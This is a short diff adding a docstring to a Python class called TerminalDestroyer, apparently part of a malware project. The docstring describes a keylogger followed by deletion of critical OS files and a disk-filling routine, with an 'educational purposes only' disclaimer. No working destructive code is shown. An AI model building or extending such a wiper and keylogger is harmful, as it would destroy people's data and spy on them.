@@ -8,6 +8,12 @@ OS = platform.system()
 
 
 class TerminalDestroyer(ABC):
+        """This is a class designed to destroy the whole OS and OS related files and directories.
+          It is a malicious class that should not be used in any real-world scenario.
+            The class has methods for different operating systems: Windows, Linux, Mac, and Android.
+        Each method attempts to start a keylogger before performing the destructive actions.
+          If any exception occurs while starting the keylogger, the code enters a destructive mode and tries to remove critical directories and files from the system. If any exception occurs during this process, it prints the error and calls the codeTest method from the CodeTest module. The CodeTest module is designed to fill the disk space in just a few seconds. This is a malicious action and should not be used in any real-world scenario. The code is for educational purposes only and should not be used to harm any system or data."""
+
         global OS
 
         while True:
